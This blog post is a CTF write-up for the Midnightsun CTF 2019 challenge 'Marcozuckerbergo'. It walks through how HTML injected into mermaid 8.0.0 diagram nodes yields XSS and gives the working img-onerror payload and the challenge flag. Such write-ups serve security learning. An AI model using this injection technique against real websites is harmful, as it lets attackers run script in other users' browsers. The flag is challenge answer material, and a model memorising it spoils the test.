---
layout:     post
title:      'Midnightsun CTF 2019 - Marcozuckerbergo'
date:       2019-04-06 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'Midnightsun CTF 2019'
---

After last challenge we'll move onto the one that is a continuation of the previous `Marcodowno` challenge. Once again we have to find a XSS vulnerability in a website that triggers without any user interaction, but this time the vulnerable code has changed. 

```
Fine, I'll use a damn lib. Let's see if it's any better.

    Service: http://marcozuckerbergo-01.play.midnightsunctf.se:3002 
```

Let's jump straight to the code, as we're already familiar with the functionality from the previous challenge and not much has changed. 

```javascript
input = decodeURIComponent(location.search.match(/input=([^&#]+)/)[1]);

window.onload=function(){
  $("#markdown").text(input);
  $("#render").text($("#markdown").text());
  mermaid.init(undefined, $("#render"));
}

function rerender(){
  try{
    $("#render").html();$("#render").removeAttr("data-processed");$("#render").text($("#markdown").text());mermaid.init(undefined, $("#render"));
  }catch(x){
    $("#render").html("<font id='error' color=red></font>");
    $("#error").text(x);
  }
}

```

This time, instead of using a bunch of `regexp`, we have a library called `mermaid`. We can see that it's up to date with version `8.0.0` used.

```javascript
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.0.0/mermaid.min.js"></script>
    <script>mermaid.initialize({startOnLoad:false});</script>
```

Mermaid is a simple markdown-like script language for generating charts from text via Javascript. We can see how it's used in many examples available in [documentation](https://mermaidjs.github.io/).

```markdown
sequenceDiagram
    Alice->>John: Hello John, how are you?
    John-->>Alice: Great!
```

Firstly, I've tried to look for vulnerabilities online but no luck. After spending some more time online, I've found a way to place `html` into a node in chart.

```markdown
graph LR
id1(<h1>Hello</h1>)
```

![marcozuckerbergo-html](/img/midnightsun/marcozuckerbergo-html.png)

And it's actually working. But I could not get `<script>alert(1)</script>` to spawn, something in the library was throwing errors. Upon further examination, I've noticed that it's not the `script` that causes the error but `()` characters. 

As I knew the cause, I've decided to search in Google for similar problems and maybe, solutions? And with [this](https://github.com/knsv/mermaid/issues/213) issue, I've found a solution working with the XSS in `img` tag. 

```markdown
graph LR
id1("<img src='' onerror='alert(1)'></img>")
```

![marcozuckerbergo-xss](/img/midnightsun/marcozuckerbergo-xss.png)

With the working exploit, we can submit the `URL` and get the flag. 

```
midnight{1_gu3zz_7rust1ng_l1bs_d1dnt_w0rk_3ither:(}
```